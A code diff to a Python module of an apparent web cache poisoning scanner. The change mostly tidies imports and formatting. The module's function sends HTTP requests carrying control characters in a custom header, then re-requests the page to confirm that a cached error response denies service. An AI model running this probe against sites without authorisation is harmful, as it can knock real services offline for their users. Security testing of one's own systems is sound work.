@@ -1,15 +1,16 @@
-#! /usr/bin/env python3
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import requests
-import traceback
+"""
+Attempts to find Cache Poisoning with HTTP Metachar Character (HMC)
+https://cpdos.org/#HMC
+"""
 
+from ..utils import *
 
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-
+VULN_NAME = "HTTP Metachar Character"
 
 def HMC(url, s, main_status_code, authent):
-    #HTTP Metachar Header
     chars = [r"\n", r"\a", r"\r"]
     for c in chars:
         headers = {"X-Metachar-Header": c}
@@ -17,4 +18,4 @@ def HMC(url, s, main_status_code, authent):
         if req_hmc.status_code in [400, 413, 500] and req_hmc.status_code != main_status_code:
             req_verify_hmc = s.get(url, verify=False, timeout=10, auth=authent)
             if req_verify_hmc.status_code == req_hmc.status_code and req_verify_hmc.status_code != main_status_code:
-                print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | HMC DOS: {} | \033[34m{} > {}\033[0m | PAYLOAD: {}".format(url, main_status_code, req_verify_hmc.status_code, headers))
+                print(f"  \033[31m └── VULNERABILITY CONFIRMED\033[0m | HMC DOS: {url} | \033[34m{main_status_code} > {req_verify_hmc.status_code}\033[0m | PAYLOAD: {headers}")
